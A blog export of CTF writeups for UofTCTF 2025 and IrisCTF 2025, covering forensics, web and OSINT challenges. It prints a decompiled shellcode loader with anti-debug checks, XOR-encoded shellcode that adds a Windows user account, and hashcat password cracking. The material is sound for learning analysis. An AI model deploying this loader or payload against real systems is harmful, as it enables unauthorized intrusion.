[{"title":"UofTCTF 2025","url":"/2025/01/18/UofTCTF-2025/","content":"UofTCTF 2025!\n\nI participated in UofTCTF 2025, organized by the University of Toronto Capture the Flag team, as a member of my institute's club, InfoSecIITR. These writeups cover the Miscellaneous, Web and Forensics challenges that I personally solved during the competition.\n\n## Forensics\n\n### Poof\n\n#### Challenge Description\n\nYet another pcap, no usb traffic in this one so I'm lost. Can you help me out? :)\n\nAuthor: 0x157\n\n#### Solution\n\nThis year, we only received one challenge from 0x157 because he was sick. We were given a poof.pcapng file for this challenge. My excitement from the previous pcap challenges, like Skat's challenge in IrisCTF '25, hadn’t worn off yet.\n\nThis challenge was solved by my teammate during the competition while I was working on another one. I attempted this challenge later.\n\nI began analyzing the pcapng file in Wireshark. First, I checked the Protocol Hierarchy Statistics, and this was the result:\n\n![Stats](/images/posts/2025-uoftctf/forensics/poof/stats.png)\n\nNext, I examined the TCP packets and found this packet, which contained a listing of the files:\n\n![List of the files](/images/posts/2025-uoftctf/forensics/poof/list.png)\n\nI proceeded to export all the files that were shared:\n\n![Export Objects](/images/posts/2025-uoftctf/forensics/poof/export_obj.png)\n\nOnly kcaswqcd.ps1 turned out to be useful, so I started analyzing it.\n\nWhat This Script Does:\n1. Variable and Object Creation:\n\n    The script dynamically creates variables using Set-Variable and Set-Item.\n    It utilizes PowerShell's -f string format operator to concatenate strings and obfuscate key values.\n\n2. Decryption Logic:\n\n    The script initializes cryptographic objects (e.g., AES decryption) and sets up parameters such as keys, initialization vectors (IVs), cipher mode, and padding.\n    It reads encrypted content and decrypts it using the specified cryptographic parameters.\n\n3. Memory Stream Operations:\n\n    The decrypted data is streamed through memory, likely preparing it for writing to a file.\n\n4. File Creation:\n\n    The decrypted content is written to an executable file (.exe) in a temporary directory.\n\n5. Execution:\n\n    The script invokes the newly created executable file using Start-Process.\n\nI extracted the useful part from the ps code:\n\n![Powershell](/images/posts/2025-uoftctf/forensics/poof/ps.png)\n\nFrom this, we obtained the CV, IV, and KEY. Let’s decrypt it on CyberChef as we already had 82nvdkandf.bin:\n\n![Cyberchef](/images/posts/2025-uoftctf/forensics/poof/cyberchef.png)\n\nAfter decrypting the file, I downloaded the PE file named poof.exe.\n\nI initially attempted to analyze it using IDA and Ghidra but was unsuccessful. Then, I tried using dnSpy, which allowed me to view the desired code.\n\n```C#\nImports System\nImports System.Diagnostics\nImports System.Runtime.CompilerServices\nImports System.Runtime.InteropServices\n\nNamespace Kljansdfkansdf\n\t' Token: 0x02000003 RID: 3\n\t<NullableContext(1)>\n\t<Nullable(0)>\n\tPublic Class Kljansdfkansdf\n\t\t' Token: 0x06000009 RID: 9 RVA: 0x00002080 File Offset: 0x00000280\n\t\tPublic Shared Sub kjfadsiewqinfqniowf(ncuasdhif As Byte())\n\t\t\tDim num As UInteger = Win32.VirtualAlloc(0UI, CUInt(ncuasdhif.Length), Win32.MEM_COMMIT, Win32.PAGE_READWRITE)\n\t\t\tMarshal.Copy(ncuasdhif, 0, CType(CType(num, UIntPtr), IntPtr), ncuasdhif.Length)\n\t\t\tDim num2 As UInteger\n\t\t\tWin32.VirtualProtect(CType(CType(num, UIntPtr), IntPtr), CType(CType(ncuasdhif.Length, IntPtr), UIntPtr), Win32.PAGE_EXECUTE_READ, num2)\n\t\t\tDim zero As IntPtr = IntPtr.Zero\n\t\t\tDim num3 As UInteger = 0UI\n\t\t\tDim zero2 As IntPtr = IntPtr.Zero\n\t\t\tWin32.WaitForSingleObject(Win32.CreateThread(0UI, 0UI, num, zero2, 0UI, num3), UInteger.MaxValue)\n\t\tEnd Sub\n\n\t\t' Token: 0x0600000A RID: 10 RVA: 0x000020E4 File Offset: 0x000002E4\n\t\tPrivate Shared Sub Main(args As String())\n\t\t\tWin32.ShowWindow(Win32.GetConsoleWindow(), Win32.SW_HIDE)\n\t\t\tIf Debugger.IsAttached Then\n\t\t\t\tEnvironment.[Exit](0)\n\t\t\tEnd If\n\t\t\tFor Each process As Process In Process.GetProcesses()\n\t\t\t\tIf process.ProcessName.Contains(\"devenv\") OrElse process.ProcessName.Contains(\"dnspy\") Then\n\t\t\t\t\tEnvironment.[Exit](0)\n\t\t\t\tEnd If\n\t\t\tNext\n\t\t\tDim array As Byte() = New Byte() { 129, 149, Byte.MaxValue, 125, 125, 125, 29, 244, 152, 76, 189, 25, 246, 45, 77, 246, 47, 113, 246, 47, 105, 246, 15, 85, 114, 202, 55, 91, 76, 130, 209, 65, 28, 1, 127, 81, 93, 188, 178, 112, 124, 186, 159, 143, 47, 42, 246, 47, 109, 246, 55, 65, 246, 49, 108, 5, 158, 53, 124, 172, 44, 246, 36, 93, 124, 174, 246, 52, 101, 158, 71, 52, 246, 73, 246, 124, 171, 76, 130, 209, 188, 178, 112, 124, 186, 69, 157, 8, 139, 126, 0, 133, 70, 0, 89, 8, 153, 37, 246, 37, 89, 124, 174, 27, 246, 113, 54, 246, 37, 97, 124, 174, 246, 121, 246, 124, 173, 244, 57, 89, 89, 38, 38, 28, 36, 39, 44, 130, 157, 34, 34, 39, 246, 111, 150, 240, 32, 23, 124, 240, 248, 207, 125, 125, 125, 45, 21, 76, 246, 18, 250, 130, 168, 198, 141, 200, 223, 43, 21, 219, 232, 192, 224, 130, 168, 65, 123, 1, 119, 253, 134, 157, 8, 120, 198, 58, 110, 15, 18, 23, 125, 46, 130, 168, 30, 16, 25, 93, 82, 30, 93, 19, 24, 9, 93, 8, 14, 24, 15, 93, 17, 24, 26, 20, 9, 8, 14, 24, 15, 93, 8, 18, 27, 9, 30, 9, 27, 6, 42, 73, 14, 34, 76, 41, 34, 47, 78, 28, 17, 17, 4, 34, 28, 51, 34, 52, 16, 13, 17, 73, 19, 9, 66, 66, 0, 93, 82, 28, 25, 25, 93, 82, 4, 125 }\n\t\t\tDim b As Byte = 125\n\t\t\tFor j As Integer = 0 To array.Length - 1\n\t\t\t\tDim array2 As Byte() = array\n\t\t\t\tDim num As Integer = j\n\t\t\t\tarray2(num) = array2(num) Xor b\n\t\t\tNext\n\t\t\tKljansdfkansdf.kjfadsiewqinfqniowf(array)\n\t\tEnd Sub\n\tEnd Class\nEnd Namespace\n```\n\nAs you can see, it was performing an XOR operation, so I wrote a script to decode it:\n\n```python\n# Given encrypted byte array\nencrypted_array = [\n    129, 149, 255, 125, 125, 125, 29, 244, 152, 76, 189, 25, 246, 45, 77, 246, 47, 113, 246, 47,\n    105, 246, 15, 85, 114, 202, 55, 91, 76, 130, 209, 65, 28, 1, 127, 81, 93, 188, 178, 112, 124,\n    186, 159, 143, 47, 42, 246, 47, 109, 246, 55, 65, 246, 49, 108, 5, 158, 53, 124, 172, 44, 246,\n    36, 93, 124, 174, 246, 52, 101, 158, 71, 52, 246, 73, 246, 124, 171, 76, 130, 209, 188, 178,\n    112, 124, 186, 69, 157, 8, 139, 126, 0, 133, 70, 0, 89, 8, 153, 37, 246, 37, 89, 124, 174, 27,\n    246, 113, 54, 246, 37, 97, 124, 174, 246, 121, 246, 124, 173, 244, 57, 89, 89, 38, 38, 28, 36,\n    39, 44, 130, 157, 34, 34, 39, 246, 111, 150, 240, 32, 23, 124, 240, 248, 207, 125, 125, 125, 45,\n    21, 76, 246, 18, 250, 130, 168, 198, 141, 200, 223, 43, 21, 219, 232, 192, 224, 130, 168, 65,\n    123, 1, 119, 253, 134, 157, 8, 120, 198, 58, 110, 15, 18, 23, 125, 46, 130, 168, 30, 16, 25, 93,\n    82, 30, 93, 19, 24, 9, 93, 8, 14, 24, 15, 93, 17, 24, 26, 20, 9, 8, 14, 24, 15, 93, 8, 18, 27, 9,\n    30, 9, 27, 6, 42, 73, 14, 34, 76, 41, 34, 47, 78, 28, 17, 17, 4, 34, 28, 51, 34, 52, 16, 13, 17,\n    73, 19, 9, 66, 66, 0, 93, 82, 28, 25, 25, 93, 82, 4, 125\n]\n\n# XOR key\nkey = 125\n\n# Decrypt the payload using XOR\ndef xor_decrypt(data, key):\n    return [byte ^ key for byte in data]\n\n# Decrypt the array\ndecrypted_array = xor_decrypt(encrypted_array, key)\n\n# Convert to bytes for further analysis\ndecrypted_bytes = bytes(decrypted_array)\n\nprint(decrypted_bytes)\n```\n\nI ran the script and obtained the following output:\n\n```bash\n$ python3 decode.py\nb'\\xfc\\xe8\\x82\\x00\\x00\\x00`\\x89\\xe51\\xc0d\\x8bP0\\x8bR\\x0c\\x8bR\\x14\\x8br(\\x0f\\xb7J&1\\xff\\xac<a|\\x02, \\xc1\\xcf\\r\\x01\\xc7\\xe2\\xf2RW\\x8bR\\x10\\x8bJ<\\x8bL\\x11x\\xe3H\\x01\\xd1Q\\x8bY \\x01\\xd3\\x8bI\\x18\\xe3:I\\x8b4\\x8b\\x01\\xd61\\xff\\xac\\xc1\\xcf\\r\\x01\\xc78\\xe0u\\xf6\\x03}\\xf8;}$u\\xe4X\\x8bX$\\x01\\xd3f\\x8b\\x0cK\\x8bX\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89D$$[[aYZQ\\xff\\xe0__Z\\x8b\\x12\\xeb\\x8d]j\\x01\\x8d\\x85\\xb2\\x00\\x00\\x00Ph1\\x8bo\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2Vh\\xa6\\x95\\xbd\\x9d\\xff\\xd5<\\x06|\\n\\x80\\xfb\\xe0u\\x05\\xbbG\\x13roj\\x00S\\xff\\xd5cmd /c net user legituser uoftctf{W4s_1T_R3ally_aN_Impl4nt??} /add /y\\x00'\n```\n\nWe got our flag!\n\nFlag:\n\n```yaml\nuoftctf{W4s_1T_R3ally_aN_Impl4nt??} \n```\n\n### Decrypt Me\n\n#### Challenge Description\n\nI encrypted my encryption script, but I forgot the password. Can you help me decrypt it?\n\nAuthor: SteakEnthusiast\n\n#### Solution\n\nIn this challenge, we received a password-protected RAR file using version 5.\n\nI examined the file's hex using the bvi hex editor and noticed that it contained flag.py and another file, flag.enc, stored as Alternate Data Streams (ADS), as shown below:\n\n![Hex Data](/images/posts/2025-uoftctf/forensics/dm/hex.png)\n\nAs expected, we needed to brute-force the password using Hashcat with a dictionary attack. To start, we needed the hash for the password of the file, so I used John the Ripper’s tool rar2john:\n\n```bash\n$ ./rar2john flag.rar > hash_rar.txt\n```\n\nFor brute-forcing with Hashcat, we need to remove everything before the colon in the output. The remaining content of hash_rar.txt was:\n\n```text\n$rar5$16$1d7cb8859a6c3c8e30a9db7a501811ac$15$280234db9d29c6ab216b74e6a89ec226$8$d12d4ba211b9c642\n$rar5$16$1d7cb8859a6c3c8e30a9db7a501811ac$15$7d06143b1a7dab3327b3ef1e41ad881a$8$d12d4ba211b9c642\n```\n\nSince flag.rar contained two files, we ended up with two hashes. Hashcat would first brute-force the first hash, and then proceed with the second one.\n\n```bash \n$ hashcat -m 13000 -a 0 -w 4 hash_rar.txt ~/Downloads/rockyou.txt \nhashcat (v6.2.6) starting\n\n[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => \n\n$rar5$16$1d7cb8859a6c3c8e30a9db7a501811ac$15$280234db9d29c6ab216b74e6a89ec226$8$d12d4ba211b9c642:toronto416\n                                                          \nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 13000 (RAR5)\nHash.Target......: $rar5$16$1d7cb8859a6c3c8e30a9db7a501811ac$15$280234...b9c642\n.\nKernel.Feature...: Pure Kernel\nGuess.Base.......: File (/home/g4rud4/Downloads/rockyou.txt)\n.\nProgress.........: 3119104/14344384 (21.74%)\nRejected.........: 0/3119104 (0.00%)\nRestore.Point....: 3117056/14344384 (21.73%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:32768-32799\nCandidate.Engine.: Device Generator\nCandidates.#1....: torrisjames -> torit13\n.\n```\n\nIt took a considerable amount of time to brute-force the password since the author had set it at the 21.74% mark of the rockyou.txt file. The password turned out to be `toronto416`.\n\nInitially, I used unrar to extract the files, but it only retrieved flag.py and not flag.enc. To extract both files from the RAR archive, I switched to using 7z, which successfully extracted them.\n\n```bash\n./7z x flag.rar\n\n7-Zip (z) 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-28\n 64-bit locale=en_IN Threads:16 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 672 bytes (1 KiB)\n\nExtracting archive: flag.rar\n--\nPath = flag.rar\nType = Rar5\nPhysical Size = 672\nCharacteristics = Locator QuickOpen:0\nEncrypted = -\nSolid = -\nBlocks = 2\nMethod = v6:128K:m3\nMultivolume = -\nVolumes = 1\n    \nEnter password:toronto416\n\nEverything is Ok\n\nFiles: 1\nAlternate Streams: 1\nAlternate Streams Size: 57\nSize:       609\nCompressed: 672\n```\n\nContent of the flag.py:\n\n```python\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad\nfrom Crypto.Hash import SHA256\nfrom time import time\nimport random\nrandom.seed(int(time()))\nKEY = SHA256.new(str(random.getrandbits(256)).encode()).digest()\nFLAG = \"uoftctf{fake_flag}\"\n\ndef encrypt_flag(flag, key):\n    cipher = AES.new(key, AES.MODE_EAX)\n    ciphertext, tag = cipher.encrypt_and_digest(flag.encode())\n    return cipher.nonce + ciphertext\n\ndef main():\n    encrypted_flag = encrypt_flag(FLAG, KEY)\n    with open(\"flag.enc\", \"wb\") as f:\n        f.write(encrypted_flag)\n\nif __name__ == \"__main__\":\n    main()\n```\n\nNext, I created a decryption script to decrypt flag.enc and retrieve the flag:\n\n```python\nfrom Crypto.Cipher import AES\nfrom Crypto.Hash import SHA256\nimport random\nfrom datetime import datetime\n\ndef get_unix_timestamp(dt_str):\n    dt = datetime.strptime(dt_str, \"%Y:%m:%d %H:%M:%S%z\")\n    return int(dt.timestamp())\n\ndef try_decrypt(encrypted_data, timestamp):\n    random.seed(timestamp)\n    \n    key = SHA256.new(str(random.getrandbits(256)).encode()).digest()\n    \n    try:\n        nonce = encrypted_data[:16]\n        ciphertext = encrypted_data[16:]\n        \n        cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)\n        decrypted = cipher.decrypt(ciphertext)\n        \n        return decrypted.decode('utf-8')\n    except Exception as e:\n        return None\n\ndef main():\n    target_time = \"2025:01:06 07:43:39+05:30\"\n    unix_timestamp = get_unix_timestamp(target_time)\n    \n    with open(\"flag.enc\", \"rb\") as f:\n        encrypted_flag = f.read()\n    \n    for offset in range(-60, 61):\n        test_timestamp = unix_timestamp + offset\n        result = try_decrypt(encrypted_flag, test_timestamp)\n        \n        if result and \"uoftctf{\" in result:\n            print(f\"Found flag at timestamp {test_timestamp}!\")\n            print(f\"Flag: {result}\")\n            return\n    \n    print(\"Flag not found in the tested time range\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\nI ran the script and obtained the following output:\n\n```bash\n$ python3 dec.py \n\nFound flag at timestamp 1736129619!  \nFlag: uoftctf{ads_and_aes_are_one_letter_apart}\n```\n\nFinally, we got our flag.\n\nFlag:\n```yaml\nuoftctf{ads_and_aes_are_one_letter_apart}\n```\n\n## Miscellaneous\n\n### Surgery\n\n#### Challenge Description\n\nI was thinking of getting some facial contouring plastic surgery done, but didn't know who to go to. My friend said they had a recommendation for a doctor specializing in that, but only sent me this photo of some building. Who's the doctor?\nBefore submitting, wrap the doctor's name in `uoftctf{}`. Special characters allowed, [First] [Last] format.\n\nFor example, if the name was Jean-Pierre Brehier, the flag would be uoftctf{Jean-Pierre Brehier}\n\nAuthor: windex\n\n#### Solution\n\nWe received the following image file:\n\n![Building Image](/images/posts/2025-uoftctf/misc/surgery/image.png)\n\nI attempted a Google Image Search on this image with the prompt: \"Where is this surgery place located?\" and found this link: https://medtour.help/clinic/jk-plastic-surgery/. I confirmed that this was the correct building because the image matched perfectly.\n\nOn the same site, I found the names of several doctors:\n\n![Doctors](/images/posts/2025-uoftctf/misc/surgery/doctors.png)\n\nI began checking them one by one. It’s worth noting that in South Korea, names are written with the last name first, followed by the first name. So, I reversed the name order for each doctor.\n\nAfter some time, I identified the correct doctor: Kim Sung-Sik.\n\nFlag:\n\n```yaml\nuoftctf{Sung-Sik Kim}\n```\n\n## Web\n\n### Scavenger Hunt\n\n#### Challenge Description\n\nYou know what to do.\n\nVisit the website [here](http://34.150.251.3:3000)\n\nAuthor: SteakEnthusiast\n\n####  Solution\n\nThis was an easy web challenge and had many solves, so I decided to attempt it. On the main page, it was mentioned that there would be seven parts of the flag.\n\nI inspected all the CSS and JavaScript files by viewing the page source. There was also a /hidden_admin_panel endpoint for the admin. I gained access by modifying the cookies to change the user. One part of the flag was hidden in the headers as a key-value pair: X-Flag-Part2: c4lm_4nd_.\n\nAltogether, we managed to collect all seven parts of the flag.\n\npart 1: uoftctf{ju57_k33p_\np_a_r_t_f_i_v_e=4pp5_\npart4=411_7h3_\npart7 c0d3!!}\npart3 1n5p3c7_\nPart 6: 50urc3_\nPart2: c4lm_4nd_\n\nFlag:\n\n```yaml\nuoftctf{ju57_k33p_c4lm_4nd_1n5p3c7_411_7h3_4pp5_50urc3_c0d3!!}\n```","tags":["forensics","misc","web"],"categories":["CTF-Writeups"]},{"title":"IrisCTF 2025","url":"/2025/01/07/IrisCTF-2025/","content":"\nIrisCTF 2025!\n\nI participated in IrisCTF 2025, organized by IrisSec, as a member of the InfoSecIITR team. Our team secured an impressive 9th place globally. These writeups detail all the OSINT and Forensics challenges that I personally solved during the competition.\n\n## OSINT\n\n### OSINT Disclaimer\n\n#### Challenge Description\n\nOSINT DISCLAIMER    50 points // 786 solves\n\nTags: freebie\n\nThe challenges this year does not require you to contact anyone. There will be no social media accounts needed to solve these challenges. Please refrain from reaching out to individuals on social media or contacting restaurants to inquire about further details. Such actions are unnecessary and will result in consequences leading to disqualification. Solving this challenge will unlock the rest of the Open-Source Intelligence category\n\nBy: Lychi\n\n#### Solution\n\nThe flag for this challenge was included in the challenge description.\n \n![Description](/images/posts/2025-irisctf/osint/osint_disc.png)\n\nThis time, the OSINT challenges were purely based on the website blog and some images. Thanks to Lychi and Bobby for creating these amazing OSINT challenges. I managed to solve all of them. \n\nFlag:\n\n```yaml\nirisctf{sp01l_f00d_1s_b4d_mk4y}\n```\n\n### Checking Out Of Winter\n\n#### Challenge Description\n\n![Description](/images/posts/2025-irisctf/osint/coow/Checking_out_desc.png)\n\nBlog's Link: https://osint-food-blog-web.chal.irisc.tf/\n\n#### Message\n\nFor beginners, I would say that doing OSINT challenges is really fun and makes you feel like an investigator. You just have to narrow down the useful data from all the information available to you. Always check for keywords, regional distinctions, special marks, or buildings, as the victim often leaves minor traces by mistake, which can help you identify them.\n\nI created this writeup in detail, especially for first-time solvers. 😉\n\n\n#### Solution\n\nIn the challenge description, keywords like *Baja California Sur, Beach, Golf, and Hotel's location farther from the main city* are traces left by the victim that can help us move forward.\n\n##### Exploring the Clues\nLet’s visit the website:\n\n![Adam's Blog](/images/posts/2025-irisctf/osint/coow/adam_site.png)\n\n\n![Adam's Stories](/images/posts/2025-irisctf/osint/coow/adam_site2.png)\n\nOn the website, we find many blogs and stories by Adam about the places he visited and the food he ate. \n\nBy matching the description, we identify that the `Pizza by The Water` blog is the most relevant one for this challenge.\n\n![Pizza By The Water's Blog](/images/posts/2025-irisctf/osint/coow/blog.png)\n\nIn the blog's image, we notice the hotel's architecture in the background, along with a pool. Since we have an image related to the location, we can perform a [Reverse Image Search](https://en.wikipedia.org/wiki/Reverse_image_search) using Google Lens.\n\n```\nNote: If the location is based in Russia, Yandex is preferable for reverse image searches. Similarly, if a country has its own powerful search engine, use that for better results.\n```\n\n\n![Google Image Search](/images/posts/2025-irisctf/osint/coow/first_google_search.png)\n\nInitially, when I searched using the full image (including the pizza and the hotel), most results were about pizzas, related sites, and posts.\n\nTo refine the search, we need to narrow down the content we are focusing on. For the next search, I used only the hotel's image and included the location Baja California Sur. This helped narrow down the results significantly.\n\n![Hotel's Name](/images/posts/2025-irisctf/osint/coow/google_image_search.png)\n\nIn the refined search results, as seen above, the AI and other sites directly suggested the hotel's name, unlike the first search. This demonstrates the importance of crafting an effective search prompt, as search engines have vast amounts of data to process.\n\n##### Creating the Flag\nWith the gathered information, let's construct the flag using the defined format.\n\nFlag:\n\n```yaml\nirisctf{Hilton_Los_Cabos_Beach_and_Golf_Resort}\n```\n\nHurray!!!\n\n### Sleuths and Sweets\n\n#### Challenge Description\n\n![Description](/images/posts/2025-irisctf/osint/sas/desc.png)\n\nBlog's Link: https://osint-food-blog-web.chal.irisc.tf/\n\n#### Solution\n\nIf you came directly to this challenge's writeup, I will recommend you first read my `Checking Out Of Winter` writeup because I have made it in detail, specifying some important notes.\n\nSo again, let's search for the keywords. I got these: *Japan, Crepes, Foot Traffic*—traces left by the victim that can help us move forward.\n\nLet's visit the website for this blog:\n\n![Blog 1](/images/posts/2025-irisctf/osint/sas/blog_1.png)\n![Blog 2](/images/posts/2025-irisctf/osint/sas/blog_2.png)\n\nThis time, we had 3 images. When I did a Reverse Image Search for the 1st and the 3rd images, I didn’t get much exact information because they looked very common across Japan.\n\nWhen I did a Reverse Image Search for the 2nd image, I got these results:\n\n![Image Search](/images/posts/2025-irisctf/osint/sas/second_image_search.png)\n\nSuggesting `Marion Crepe Ueno Ameyoko Store`, which was not the correct address for the flag. \n\n##### Exploring other way\n\nSo this time, I tried another method. As the description mentioned Foot Traffic, I searched for the place with the highest foot traffic in Japan. \n\n```\nThe place with the highest foot traffic in Japan is Shibuya Crossing in Tokyo, which is widely considered the busiest pedestrian crossing in the world, with thousands of people crossing at once during rush hour. \n```\n\nI then refined my search for crepe shops near Shibuya Crossing on Google Maps. After checking several stores, I finally found the correct one, as shown below:\n\n![Desired Store](/images/posts/2025-irisctf/osint/sas/crepes_store.png)\n\nLocation: [Marion Crepes Shibuya Modi](https://maps.app.goo.gl/9np7WRbr9eapY6dZ9)\n\nIt had similar images to those given in the blog.\n\n##### Creating the Flag\nWith the gathered information, let's construct the flag using the defined format.\n\nFlag: \n\n```yaml\nirisctf{1_Chome_21_3_Jinnan_Shibuya}\n```\n\nAnother one solved! 🥳 \n\n### Not Eelaborate\n\n#### Challenge Description\n\n![Description](/images/posts/2025-irisctf/osint/ne/desc.png)\n\nBlog's Link: https://osint-food-blog-web.chal.irisc.tf/\n\n#### Solution\n\nIf you came directly to this challenge's writeup, I will recommend you first read my `Checking Out Of Winter` writeup because I have made it in detail, specifying some important notes.\n\nSo again, let's search for the keywords. I got these: *Title - Eel, Deer Park, Japenese Food, Quiet Restaurant*- traces left by the victim that can help us move forward.\n\nLet's visit the website for this blog:\n\n![Blog](/images/posts/2025-irisctf/osint/ne/blog.png)\n\nSo, I started searching for Deer Parks in Japan and found one famous Deer Park, `Nara Park`, which helped me narrow down my search.\n\nThe food dishes mentioned in the blog hinted at the `Unagi Dish`. I then did a Reverse Image Search for the given image using the prompt `Unagi Dish Restaurant near Nara Park`. This search suggested some restaurants, and the first restaurant had a similar dish plate, as shown below:\n\n![Image Search](/images/posts/2025-irisctf/osint/ne/image_search.png)\n\nFinally, search for the restaurant on Google Maps, and you will get the correct name, which is located near Nara Park.\n\n![Restaurant](/images/posts/2025-irisctf/osint/ne/restaurant.png)\n\nLocation: [Edogawa Kintetsu Nara](https://maps.app.goo.gl/d2VqjxsCzop5jx1y6)\n\n##### Creating the Flag\n\nWith the gathered information, let's construct the flag using the defined format.\n\nFlag:\n\n```yaml\nirisctf{Edogawa_Kintetsu_Nara}\n```\n\nOne more solved!\n\n### Late Night Bite\n\n#### Challenge Description\n\n![Description](/images/posts/2025-irisctf/osint/lnb/desc.png)\n\nBlog's Link: https://osint-food-blog-web.chal.irisc.tf/\n\n#### Solution\n\nIf you came directly to this challenge's writeup, I will recommend you first read my `Checking Out Of Winter` writeup because I have made it in detail, specifying some important notes.\n\nThis challenge was a little tricky. Let's start.\n\nAccording to the description, Adam hid his favorite hangout spot, which he had recorded in the past.\n\nAt first, I thought he didn’t directly mention the Late Night Bite blog, so I explored the other uncovered blogs but didn’t find anything useful related to the challenge.\n\nThen, I went to the `About` section of Adam's site.\n\n![About](/images/posts/2025-irisctf/osint/lnb/about.png)\n\nIn the About section, I noticed that Adam is a food blogger based in Southern California and that on Wednesdays, he stops by the farmer’s market before work.\n\nI speculated that the farmer's market might be the nearest location around his house. When I did a Reverse Image Search on the image provided in the About section, I realized the location was `Santa Monica Pier`.\n\nI then did another Reverse Image Search with the prompt:\n\n![Image Search](/images/posts/2025-irisctf/osint/lnb/image_search.png)\n\nI believed Adam was talking about the `Downtown Farmers Market` because of the Wednesday mention.\n\nBut I still didn’t have any clue about the restaurant's name, so I started searching through the blog on his site again. Since I have some foundational knowledge of web dev/exp, I began by viewing the Page Source. In the source, Adam mentioned this line:\n\n```\n<!-- MY SUPER SECRET POST: \"late night bite\" -->\n```\n\nThen, I tried the robots.txt endpoint – https://osint-food-blog-web.chal.irisc.tf/robots.txt.\n\nThere, I found a mention of: Sitemap: /sitemap.xml.\n\nI went to this endpoint and discovered every endpoint related to his blogs. After scrolling, I found a mention of the Late Night Bite blog as:\n\n```\n<url>\n<loc>/late-night-bite/</loc>\n<lastmod>2025-01-02T00:00:00-08:00</lastmod>\n</url>\n```\nSo, finally, I found the blog that was hidden by Adam.\n\n![Late Night Bite Blog](/images/posts/2025-irisctf/osint/lnb/late_night_bite_blog.png)\n\nSo, I quickly searched for a Modern Local Izakaya Restaurant with those features near Santa Monica on Google.\n\nI found this helpful site:\n\n![Restaurants](/images/posts/2025-irisctf/osint/lnb/restaurant.png)\n\nThe first restaurant, Shirubē, was near the Downtown Farmers Market, and it also had the features mentioned by Adam.\n\n##### Creating the Flag\n\nWith the gathered information, let's construct the flag using the defined format.\n\nFlag:\n\n``` yaml\nirisctf{Shirube}\n```\n\n*This marks the last challenge based on the Food Blog website. Thanks to `lychi` for creating this amazing challenge; I really enjoyed it.*\n\n### Fuel Deal\n\n#### Challenge Description\n\n![Description](/images/posts/2025-irisctf/osint/fd/desc.png)\n\nSource File: [fuel-deal.tar.gz](/images/posts/2025-irisctf/osint/fd/fuel-deal.tar.gz)\n\n#### Solution\n\nIf you came directly to this challenge's writeup, I will recommend you first read my `Checking Out Of Winter` writeup because I have made it in detail, specifying some important notes.\n\nSo again, let's search for the keywords. I got this: *Good Fuel Deal*.\n \n![Chal's Image](/images/posts/2025-irisctf/osint/fd/fuel-deal.png)\n\nI did a Reverse Image Search but didn’t get much of a lead. Then, I tried one of the cool tools, [GeoSpy AI](https://geospy.ai/), which showed me this result:\n\n![GeoSpy AI's Result](/images/posts/2025-irisctf/osint/fd/geospy_ai.png)\n\nNot every time does this AI give you the correct location, but since there were mentions of Australia in my Google Image Search, I decided to try the suggested location, Melbourne, Australia.\n\nI then searched on Google with the query: `Where were the cheap fuels (with the rate price mentioned in the provided image) in Melbourne?` and got some of these results:\n\n```\nThe cheapest diesel available in Victoria costs 183.9 cents per litre.\n```\n\nThen found this helpful site : https://www.carexpert.com.au/car-news/the-cheapest-petrol-and-diesel-around-australia-this-week\\\n\nThe above site had these rates : \n\n```less\nVictoria-\n\nThe cheapest unleaded petrol in Victoria today costs 169.9 cents per litre. You can find it at Liberty Pakenham.\n\nThe cheapest diesel available in Victoria costs 183.9 cents per litre. You can find it at SE Fuel in Mount Waverley.\n\nMetro – Melbourne\t                                Statewide\nUnleaded 91\t183.9 (Metro Petroleum Maribynong)\t169.9 (Liberty Pakenham)\nPremium Unleaded 95\t187.9 (APCO Hoppers Crossing)\t191.5 (APCO Bendigo)\nPremium Unleaded 98\t204 (Liberty Baxter)\t        197.9 (Shell Heywood)\nDiesel 183.9 (SE Fuel Mount Waverley)\t                189.1 (Independent Morwell)\n```\n\nI started searching with all the locations mentioned above from the beginning. Finally, when I was searching for the `SE Fuel Mount Waverly` location on Google Maps, I found some of these fuel stations:\n\n![SE Fuel Mount Waverly](/images/posts/2025-irisctf/osint/fd/se_fuel_search_result.png)\n\nAfter scrolling down, I identified that the Shell station was the desired fuel station. If you check the photos or the 360-degree view of that location, it was identifiable with the provided image.\n\nLocation : [Shell](https://maps.app.goo.gl/3CazWSRMCeDk5Wip7)\n\n##### Creating the Flag\nWith the gathered information, let's construct the flag using the defined format.\n\nFlag:\n\n```yaml\nirisctf{203_Gallaghers_Road_Glen_Waverley_Victoria_Australia}\n```\n\nWoah!!!\n\n### Where's Bobby\n\n#### Challenge Description\n\n![Description](/images/posts/2025-irisctf/osint/wb/desc.png)\n\nSource File: [files](/images/posts/2025-irisctf/osint/wb/wheres-bobby.tar.gz)\n\nHints releasd on Discord Announcements:\n\n![Hints](/images/posts/2025-irisctf/osint/wb/hints.png)\n\n#### Solution\n\nIf you came directly to this challenge's writeup, I will recommend you first read my `Checking Out Of Winter` writeup because I have made it in detail, specifying some important notes.\n\nSo again, let's search for the keywords. I got these: *Road Trip, Water Body, Not much populated areas* - traces left by the author.\n\nProvided Image:\n\n<img src=\"/images/posts/2025-irisctf/osint/wb/wheres-bobby.jpg\" alt=\"Source File Image\" height=\"700\">\n\n<!-- ![Source File Image](/images/posts/2025-irisctf/osint/wb/wheres-bobby.jpg) -->\n\nI like the view of the image. This image was taken from a car on a road that appears to be in the middle of the mountains.\n\nWhen we zoom in on the image, we can see something written in Chinese on the board. I checked it using Google Translator:\n\n<img src=\"/images/posts/2025-irisctf/osint/wb/translated.jpg\" alt=\"Translated\" height=\"400\">\n\n<!-- ![Translated Text](/images/posts/2025-irisctf/osint/wb/translated.jpg) -->\n\nTranslated Text in the above image:\n```\nSmooth traffic from Xishatun Bridge to Louzizhuang Bridge.\n```\n\nThe board was showing the traffic conditions of the upcoming bridges, which means the author was about to enter this bridge via the connected roads from where they were coming.\n\nThe possible routes near these two bridges are:\nG7, G6, G4501, S216, S321, S3801.\n\n![Google Map](/images/posts/2025-irisctf/osint/wb/google_map.png)\n\nAs the author mentioned the surroundings of the route as *Water 